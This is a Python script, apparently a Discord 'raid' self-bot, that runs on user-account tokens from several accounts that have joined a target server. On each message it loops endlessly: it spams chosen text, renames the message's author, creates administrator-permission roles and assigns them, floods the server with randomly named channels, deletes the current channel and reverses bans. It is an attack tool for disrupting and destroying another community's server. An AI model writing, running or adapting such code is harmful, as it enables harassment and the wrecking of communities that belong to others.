import discord
import time
import random
import string
from discord.utils import get
from discord.ext import commands
import asyncio

print("make sure that you join the target server on all 5 accounts beforehand, THE ACCOUNTS CAN NOT BE ON ANY OTHER SERVERS")
time.sleep(2)
response=input("type what you want the bots to spam here: ")

TOKEN="INSERT TOKEN HERE"

client = commands.Bot(command_prefix="", self_bot=True)        

@client.event
async def on_ready():
    print('1 bot connected to Discord!')

@client.event
async def on_member_ban(guild,user):
    await guild.unban(user)
    print("removed ban")

@client.event
async def on_message(message):
    time.sleep(0.7)
    x=100
    while int(x)==100:
        print("message sent "+random.choice(string.ascii_letters))
        try:
            await message.channel.send(response)
        except:
            print("message error")
            pass
        try:
            user=message.author
            await user.edit(nick=str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters)))
        except:
            print("can't change user nick")
            pass
        guild=message.guild
        perms=discord.Permissions(administrator=True)
        try:
            user=message.author
            await guild.create_role(name='TEST', colour=discord.Colour(0x597E8D),permissions=perms)
            role=get(guild.roles,name='TEST')
            await user.add_roles(role)
        except:
            print("maximum number of roles reached or can't add roles")
            pass
        guild=message.guild
        try:
            await guild.create_text_channel(str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters)))
            await guild.create_text_channel(str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters))+str(random.choice(string.ascii_letters)))
            await message.channel.delete()
            print("channel yeeted")
            user=message.author
        except:
            print("can't add channel")
            pass
        
@client.event
async def on_guild_channel_create(channel):
    await channel.send(response)
    
client.run(TOKEN,bot=False)
